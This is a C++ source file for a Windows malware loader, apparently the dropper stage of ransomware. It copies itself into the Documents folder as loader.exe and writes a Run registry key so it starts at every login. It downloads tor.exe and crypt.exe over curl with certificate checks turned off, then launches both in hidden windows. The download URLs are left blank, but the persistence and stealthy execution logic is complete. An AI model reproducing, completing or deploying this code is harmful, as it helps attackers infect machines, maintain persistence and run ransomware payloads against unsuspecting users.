#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0400
#endif

#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <string.h>
#include <iostream>
#include <dirent.h>
#include <shlwapi.h>
#include <sstream>
#include <fstream>
#include <curl/curl.h>

#define RW_SIZE         512
#define BUFFER_SIZE     RW_SIZE * 2

using namespace std;

bool file_exists (const std::string& name) {
    ifstream f(name.c_str());
    return f.good();
}

string getDocumentsFolder(){
    char szPath[MAX_PATH];

    SHGetFolderPath(NULL, CSIDL_PERSONAL,NULL,0,szPath);

    string a = std::string(szPath);
    return a;
}

void writeToRegistry(){

    string dc = getDocumentsFolder();
    std::stringstream ss;
    ss << dc << "\\loader.exe";
    std::string s = ss.str();

    HKEY hkey;
    LONG result_open, result_write, result_close;

    result_open = RegOpenKeyEx(HKEY_CURRENT_USER,
                  "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_WRITE, &hkey);

    result_write = RegSetValueEx(hkey, "testval", 0, REG_SZ, (const uint8_t*)s.c_str(), strlen(s.c_str()));

    result_close = RegCloseKey(hkey);
}

void copyItselfToDocuments(){

    TCHAR pBuf[MAX_PATH];
    int bytes = GetModuleFileName(NULL, pBuf, MAX_PATH);

    char szPath[MAX_PATH];

    SHGetFolderPath(NULL, CSIDL_PERSONAL,NULL,0,szPath);

    char szPath1[MAX_PATH];

    strcpy(szPath1, szPath);
    strcat(szPath1, "\\loader.exe");

    CopyFile(pBuf, szPath1, FALSE);
}

void downloadTor(){

  CURL *curl;
  FILE *fp;
  CURLcode res;

  curl = curl_easy_init();

  if(curl) {
    fp = fopen("tor.exe","wb");
    curl_easy_setopt(curl, CURLOPT_URL,"");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    res = curl_easy_perform(curl);

    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));


      curl_easy_cleanup(curl);

      fclose(fp);
    }
}

void downloadCrypt(){
  CURL *curl;
  FILE *fp;
  CURLcode res;

  curl = curl_easy_init();

  if(curl) {
    fp = fopen("crypt.exe","wb");
    curl_easy_setopt(curl, CURLOPT_URL,"");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    res = curl_easy_perform(curl);

    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));


      curl_easy_cleanup(curl);

      fclose(fp);
    }
}

int main()
{
    string dc = getDocumentsFolder();
    std::stringstream ss;
    ss << dc << "\\logFile.txt";
    std::string s = ss.str();

    if (!file_exists(s)){
        copyItselfToDocuments();
        writeToRegistry();
        SetCurrentDirectory(dc.c_str());
        downloadTor();
        downloadCrypt();
    }

    SetCurrentDirectory(dc.c_str());

    ShellExecute(0,"open","tor.exe",NULL,NULL,SW_HIDE);
    ShellExecute(0,"open","crypt.exe",NULL,NULL,SW_HIDE);

    return 0;
}